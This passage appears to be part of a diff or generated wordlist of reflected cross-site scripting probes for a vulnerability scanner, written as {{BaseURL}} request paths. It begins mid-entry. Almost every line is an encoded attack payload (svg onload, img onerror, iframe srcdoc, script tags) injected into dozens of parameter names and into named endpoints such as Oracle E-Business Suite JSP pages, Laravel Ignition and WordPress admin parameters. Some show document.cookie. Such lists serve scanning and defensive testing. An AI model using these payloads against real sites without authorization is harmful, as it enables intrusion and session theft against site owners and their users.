22%3Csvg%2Fonload=confirm%28%27xss-modify%27%29%3E&pwd=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-pwd%27%29%3E&file=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-file%27%29%3E"
+- "prompt('XSS')"
+- "redirect=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-redirect%27%29%3E&linkcheck=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-linkcheck%27%29%3E&port=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-port%27%29%3E&password=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-password%27%29%3E&target=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-target%27%29%3E&method=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-method%27%29%3E&note=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-note%27%29%3E&amount=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-amount%27%29%3E&set=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-set%27%29%3E&q=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-q%27%29%3E&select=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-select%27%29%3E&cid=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-cid%27%29%3E&tag=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-tag%27%29%3E&keyword=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-keyword%27%29%3E"
+- "rememberme=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-rememberme%27%29%3E&module=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-module%27%29%3E&comment_ID=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-comment_ID%27%29%3E&client_id=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-client_id%27%29%3E&noheader=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-noheader%27%29%3E&del=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-del%27%29%3E&media=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-media%27%29%3E&user_name=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-user_name%27%29%3E&country=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-country%27%29%3E&phone=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-phone%27%29%3E&sidebar=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-sidebar%27%29%3E&version=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-version%27%29%3E&widget_id=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-widget_id%27%29%3E&class=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-class%27%29%3E"
+- "send=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-send%27%29%3E&attachment_id=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-attachment_id%27%29%3E&wp_screen_options=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-wp_screen_options%27%29%3E&page_id=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-page_id%27%29%3E&locale=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-locale%27%29%3E&function=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-function%27%29%3E&profile=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-profile%27%29%3E&day=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-day%27%29%3E&folder=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-folder%27%29%3E&mobile=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-mobile%27%29%3E&settings=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-settings%27%29%3E&comments=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-comments%27%29%3E&all=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-all%27%29%3E&menu=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-menu%27%29%3E"
+- "sort=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-sort%27%29%3E&msg=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-msg%27%29%3E&hostname=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-hostname%27%29%3E&directory=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-directory%27%29%3E&disabled=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-disabled%27%29%3E&last_name=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-last_name%27%29%3E&oauth_token=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-oauth_token%27%29%3E&first_name=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-first_name%27%29%3E&delete_widget=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-delete_widget%27%29%3E&md5=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-md5%27%29%3E&selection=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-selection%27%29%3E&filename=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-filename%27%29%3E&address=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-address%27%29%3E"
+- "subject=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-subject%27%29%3E&sticky=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-sticky%27%29%3E&ns=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-ns%27%29%3E&history=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-history%27%29%3E&category_id=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-category_id%27%29%3E&metakeyselect=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-metakeyselect%27%29%3E&copy=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-copy%27%29%3E&product_id=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-product_id%27%29%3E&status=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-status%27%29%3E&cat=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-cat%27%29%3E&list=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-list%27%29%3E&val=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-val%27%29%3E&what=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-what%27%29%3E&group_id=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-group_id%27%29%3E"
+- "t=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-t%27%29%3E&comment=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-comment%27%29%3E&post_id=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-post_id%27%29%3E&postid=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-postid%27%29%3E&config=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-config%27%29%3E&login=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-login%27%29%3E&paged=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-paged%27%29%3E&go=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-go%27%29%3E&tag_ID=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-tag_ID%27%29%3E&user_login=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-user_login%27%29%3E&part=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-part%27%29%3E&preview_id=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-preview_id%27%29%3E&_ajax_nonce=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-_ajax_nonce%27%29%3E&widget-id=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-widget-id%27%29%3E"
+- "tab=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-tab%27%29%3E&domain=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-domain%27%29%3E&show=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-show%27%29%3E&submit=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-submit%27%29%3E&move=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-move%27%29%3E&userid=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-userid%27%29%3E&oitar=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-oitar%27%29%3E&key=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-key%27%29%3E&description=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-description%27%29%3E&user=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-user%27%29%3E&active=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-active%27%29%3E&clone=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-clone%27%29%3E&success=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-success%27%29%3E&slug=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-slug%27%29%3E"
+- "tags=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-tags%27%29%3E&e=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-e%27%29%3E&users=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-users%27%29%3E&format=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-format%27%29%3E&dl=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-dl%27%29%3E&position=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-position%27%29%3E&url=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-url%27%29%3E&theme=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-theme%27%29%3E&firstname=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-firstname%27%29%3E&fields=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-fields%27%29%3E&form=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-form%27%29%3E&level=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-level%27%29%3E&month=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-month%27%29%3E&oauth_verifier=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-oauth_verifier%27%29%3E"
+- "taxonomy=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-taxonomy%27%29%3E&tables=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-tables%27%29%3E&confirm=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-confirm%27%29%3E&db_port=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-db_port%27%29%3E&op=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-op%27%29%3E&untrashed=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-untrashed%27%29%3E&tid=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-tid%27%29%3E&flag=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-flag%27%29%3E&stylesheet=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-stylesheet%27%29%3E&download=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-download%27%29%3E&comment_status=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-comment_status%27%29%3E&_wpnonce=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-_wpnonce%27%29%3E&metakeyinput=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-metakeyinput%27%29%3E&remove=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-remove%27%29%3E"
+- "title=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-title%27%29%3E&view=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-view%27%29%3E&context=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-context%27%29%3E&passwd=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-passwd%27%29%3E&count=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-count%27%29%3E&delete=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-delete%27%29%3E&test=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-test%27%29%3E&hash=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-hash%27%29%3E&csrf_token=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-csrf_token%27%29%3E&o=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-o%27%29%3E&activate=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-activate%27%29%3E&edit=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-edit%27%29%3E&ip=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-ip%27%29%3E&r=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-r%27%29%3E"
+- "u=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-u%27%29%3E&groups=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-groups%27%29%3E&signup_for=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-signup_for%27%29%3E&user_id=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-user_id%27%29%3E&type=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-type%27%29%3E&desc=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-desc%27%29%3E&newcontent=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-newcontent%27%29%3E&foo=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-foo%27%29%3E&message=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-message%27%29%3E&d=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-d%27%29%3E&width=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-width%27%29%3E&_wp_http_referer=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-_wp_http_referer%27%29%3E&post_status=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-post_status%27%29%3E&author=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-author%27%29%3E"
+- "uname=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-uname%27%29%3E&command=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-command%27%29%3E&reverse=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-reverse%27%29%3E&cancel=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-cancel%27%29%3E&h=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-h%27%29%3E&logout=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-logout%27%29%3E&section=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-section%27%29%3E&gid=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-gid%27%29%3E&input=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-input%27%29%3E&post_type=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-post_type%27%29%3E&page=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-page%27%29%3E&updated=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-updated%27%29%3E&charset=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-charset%27%29%3E&v=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-v%27%29%3E"
+- "up=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-up%27%29%3E&body=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-body%27%29%3E&return=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-return%27%29%3E&end=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-end%27%29%3E&n=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-n%27%29%3E&opt=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-opt%27%29%3E&source=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-source%27%29%3E&y=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-y%27%29%3E&parent=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-parent%27%29%3E&reason=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-reason%27%29%3E&meta=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-meta%27%29%3E&pass1=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-pass1%27%29%3E&blog=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-blog%27%29%3E&plugin=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-plugin%27%29%3E"
+- "var wah_target_src = '';alert(document.domain);//';"
+- "widget=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-widget%27%29%3E&height=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-height%27%29%3E&screen=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-screen%27%29%3E&pass2=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-pass2%27%29%3E&redirect_to=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-redirect_to%27%29%3E&items=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-items%27%29%3E&string=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-string%27%29%3E&hidden=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-hidden%27%29%3E&f=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-f%27%29%3E&step=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-step%27%29%3E&role=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-role%27%29%3E&preview_nonce=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-preview_nonce%27%29%3E&date=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-date%27%29%3E&event=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-event%27%29%3E"
+- "{{BaseURL}}'6'%22()%26%25%22%3E%3Csvg/onload=confirm(1)%3E/"
+- "{{BaseURL}}'</script><img src=x onerror=confirm(1)>"
+- "{{BaseURL}}'<iframe/onload=confirm(1)>"
+- "{{BaseURL}}'><Svg Only=1 OnLoad=confirm(1)>"
+- "{{BaseURL}}'><details/open/ontoggle=confirm(1)>"
+- "{{BaseURL}}'><svg><circle><set onbegin=confirm(1) attributename=fill>"
+- "{{BaseURL}}'\"><sVg/OnLuFy=\"X=y\"oNloaD=;1^confirm(1)>/``^1//"
+- "{{BaseURL}}/%22%3E%3Ciframe%20srcdoc=%22%3Cscript%3Ealert(document.cookie)%3C/script%3E%22%3E%3C/iframe%3E"
+- "{{BaseURL}}/%22%3E%3Cimg%20src=x%20onerror=alert(document.cookie)%3E"
+- "{{BaseURL}}/%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E"
+- "{{BaseURL}}/%22%3E%3Csvg/onload=alert(document.cookie)%3E"
+- "{{BaseURL}}/%3Cscript%3Ealert(document.domain)%3C/script%3E"
+- "{{BaseURL}}/7/0/33/1d/www.citysearch.com/search?what=x&where=place%22%3E%3Csvg+onload=confirm(document.domain)%3E"
+- "{{BaseURL}}/<script>alert('XSS')</script>"
+- "{{BaseURL}}/?api=%27%3E%22%3Csvg%2Fonload=confirm%28%27api%27%29%3E&api_key=%27%3E%22%3Csvg%2Fonload=confirm%28%27api_key%27%29%3E&begindate=%27%3E%22%3Csvg%2Fonload=confirm%28%27begindate%27%29%3E&callback=%27%3E%22%3Csvg%2Fonload=confirm%28%27callback%27%29%3E&categoryid=%27%3E%22%3Csvg%2Fonload=confirm%28%27categoryid%27%29%3E&csrf_token=%27%3E%22%3Csvg%2Fonload=confirm%28%27csrf_token%27%29%3E&email=%27%3E%22%3Csvg%2Fonload=confirm%28%27email%27%29%3E&emailto=%27%3E%22%3Csvg%2Fonload=confirm%28%27emailto%27%29%3E&enddate=%27%3E%22%3Csvg%2Fonload=confirm%28%27enddate%27%29%3E&immagine=%27%3E%22%3Csvg%2Fonload=confirm%28%27immagine%27%29%3E&item=%27%3E%22%3Csvg%2Fonload=confirm%28%27item%27%29%3E&jsonp=%27%3E%22%3Csvg%2Fonload=confirm%28%27jsonp%27%29%3E&l=%27%3E%22%3Csvg%2Fonload=confirm%28%27l%27%29%3E&lang=%27%3E%22%3Csvg%2Fonload=confirm%28%27lang%27%29%3E&list_type=%27%3E%22%3Csvg%2Fonload=confirm%28%27list_type%27%29%3E"
+- "{{BaseURL}}/?hc=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E"
+- "{{BaseURL}}/?id=%22%3E%3Ciframe%20srcdoc=%22%3Cscript%3Ealert(document.cookie)%3C/script%3E%22%3E%3C/iframe%3E"
+- "{{BaseURL}}/?id=%22%3E%3Cimg%20src=x%20onerror=alert(document.cookie)%3E"
+- "{{BaseURL}}/?id=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E"
+- "{{BaseURL}}/?id=%22%3E%3Csvg/onload=alert(document.cookie)%3E"
+- "{{BaseURL}}/?id=<script>alert('XSS')</script>"
+- "{{BaseURL}}/?month=%27%3E%22%3Csvg%2Fonload=confirm%28%27month%27%29%3E&page_id=%27%3E%22%3Csvg%2Fonload=confirm%28%27page_id%27%29%3E&password=%27%3E%22%3Csvg%2Fonload=confirm%28%27password%27%29%3E&terms=%27%3E%22%3Csvg%2Fonload=confirm%28%27terms%27%29%3E&token=%27%3E%22%3Csvg%2Fonload=confirm%28%27token%27%29%3E&type=%27%3E%22%3Csvg%2Fonload=confirm%28%27type%27%29%3E&unsubscribe_token=%27%3E%22%3Csvg%2Fonload=confirm%28%27unsubscribe_token%27%29%3E&year=%27%3E%22%3Csvg%2Fonload=confirm%28%27year%27%29%3E"
+- "{{BaseURL}}/?option=com_oscommerce&osMod=mshop_pl_src&manufacturers_id=7&sort=products_sort_order&page=index.php&format=xml&task=showproducts&view=med&sort=latest&sortdir=descgt5po%3Cimg%20src=a%20onerror=alert(document.domain)%3Evh217"
+- "{{BaseURL}}/?q=%22%3E%3Ciframe%20srcdoc=%22%3Cscript%3Ealert(document.cookie)%3C/script%3E%22%3E%3C/iframe%3E"
+- "{{BaseURL}}/?q=%22%3E%3Cimg%20src=x%20onerror=alert(document.cookie)%3E"
+- "{{BaseURL}}/?q=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E"
+- "{{BaseURL}}/?q=%27%3E%22%3Csvg%2Fonload=confirm%28%27q%27%29%3E&s=%27%3E%22%3Csvg%2Fonload=confirm%28%27s%27%29%3E&search=%27%3E%22%3Csvg%2Fonload=confirm%28%27search%27%29%3E&id=%27%3E%22%3Csvg%2Fonload=confirm%28%27id%27%29%3E&action=%27%3E%22%3Csvg%2Fonload=confirm%28%27action%27%29%3E&keyword=%27%3E%22%3Csvg%2Fonload=confirm%28%27keyword%27%29%3E&query=%27%3E%22%3Csvg%2Fonload=confirm%28%27query%27%29%3E&page=%27%3E%22%3Csvg%2Fonload=confirm%28%27page%27%29%3E&keywords=%27%3E%22%3Csvg%2Fonload=confirm%28%27keywords%27%29%3E&url=%27%3E%22%3Csvg%2Fonload=confirm%28%27url%27%29%3E&view=%27%3E%22%3Csvg%2Fonload=confirm%28%27view%27%29%3E&cat=%27%3E%22%3Csvg%2Fonload=confirm%28%27cat%27%29%3E&name=%27%3E%22%3Csvg%2Fonload=confirm%28%27name%27%29%3E&key=%27%3E%22%3Csvg%2Fonload=confirm%28%27key%27%29%3E&p=%27%3E%22%3Csvg%2Fonload=confirm%28%27p%27%29%3E"
+- "{{BaseURL}}/?q=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss%27%29%3E&s=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss%27%29%3E&search=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss%27%29%3E&id=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss%27%29%3E&action=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss%27%29%3E&keyword=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss%27%29%3E&query=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss%27%29%3E&page=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss%27%29%3E&keywords=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss%27%29%3E&url=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss%27%29%3E&view=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss%27%29%3E&cat=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss%27%29%3E&name=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss%27%29%3E&key=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss%27%29%3E&p=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss%27%29%3E"
+- "{{BaseURL}}/?q=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss1%27%29%3E&s=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss2%27%29%3E&search=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss3%27%29%3E&id=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss4%27%29%3E&action=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss5%27%29%3E&keyword=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss6%27%29%3E&query=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss7%27%29%3E&page=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss8%27%29%3E&keywords=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss9%27%29%3E&url=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss10%27%29%3E&view=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss11%27%29%3E&cat=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss12%27%29%3E&name=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss13%27%29%3E&key=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss14%27%29%3E&p=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss15%27%29%3E&redirect_uri=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss15%27%29%3E&redirect_url=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss15%27%29%3E"
+- "{{BaseURL}}/?review_id=1&itwed%22onmouseover=%22confirm(document.domain)%22style=%22position:absolute%3bwidth:100%25%3bheight:100%25%3btop:0%3bleft:0%3b%22b7yzn=1"
+- "{{BaseURL}}/?up=%27%22%20teste=efx-821&regiao=%27%22%20teste=efx-822&ordem=%27%22%20teste=efx-823&page_code=%27%22%20teste=efx-824&docId=%27%22%20teste=efx-825&vitrine=%27%22%20teste=efx-826&task=%27%22%20teste=efx-827&hash_identificacao=%27%22%20teste=efx-828&onload=%27%22%20teste=efx-829&filme=%27%22%20teste=efx-830&servico=%27%22%20teste=efx-831&refer=%27%22%20teste=efx-832&codNoticia=%27%22%20teste=efx-833&hashId=%27%22%20teste=efx-834&modo=%27%22%20teste=efx-835&sourcepage=%27%22%20teste=efx-836&idConteudo=%27%22%20teste=efx-837"
+- "{{BaseURL}}/?xmlcontrol=body%20onload=alert(document.domain)"
+- "{{BaseURL}}/OA_HTML/ieuiMeetingErrorDisplay.jsp%3FErrCode%3D%27%22%3E%3Csvg%2Fonload%3Dalert('{{randstr}}')%3E"
+- "{{BaseURL}}/OA_HTML/jtfLOVInProcess.jsp%3FAAA%3DAAAAAAAAAA%27%22%3E%3Csvg%2Fonload%3Dalert('{{randstr}}')%3E"
+- "{{BaseURL}}/OA_HTML/oksAutoRenewalHelp.jsp%3Fthanks%3D%27%22%3E%3Csvg%2Fonload%3Dalert('{{randstr}}')%3E"
+- "{{BaseURL}}/_ignition/scripts/--><svg%20onload=alert(document.domain)>"
+- "{{BaseURL}}/account/search?user=<img src=x onerror=alert('XSS')>"
+- "{{BaseURL}}/account/search?user=<script>alert('XSS')</script>"
+- "{{BaseURL}}/account/search?user=<svg onload=alert('XSS')>"
+- "{{BaseURL}}/acs/..;/admin/public/login.jsp?error=%3Cscript%3Ealert(document.domain)%3C/script%3e"
+- "{{BaseURL}}/admin.back<img src=a onerror=alert('{{randstr}}')>"
+- "{{BaseURL}}/admin/public/login.jsp?error=%3Cscript%3Ealert(document.domain)%3C/script%3e"
+- "{{BaseURL}}/admin/search?query=<img src=x onerror=alert('XSS')>"
+- "{{BaseURL}}/admin/search?query=<script>alert('XS')</script>"
+- "{{BaseURL}}/admin/search?query=<svg onload=alert('XSS')>"
+- "{{BaseURL}}/admin?q=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss1%27%29%3E&s=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss2%27%29%3E&search=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss3%27%29%3E&id=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss4%27%29%3E&action=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss5%27%29%3E&keyword=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss6%27%29%3E&query=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss7%27%29%3E&page=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss8%27%29%3E&keywords=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss9%27%29%3E&url=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss10%27%29%3E&view=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss11%27%29%3E&cat=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss12%27%29%3E&name=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss13%27%29%3E&key=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss14%27%29%3E&p=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss15%27%29%3E&redirect_uri=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss15%27%29%3E&redirect_url=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss15%27%29%3E"
+- "{{BaseURL}}/api/query?input=<img src=x onerror=alert('XSS')>"
+- "{{BaseURL}}/api/query?input=<script>alert('XSS')</script>"
+- "{{BaseURL}}/api/query?input=<svg onload=alert('SS')>"
+- "{{BaseURL}}/api/search?q=<img src=x onerror=alert('XSS')>"
+- "{{BaseURL}}/api/search?q=<script>alert('XSS')</script>"
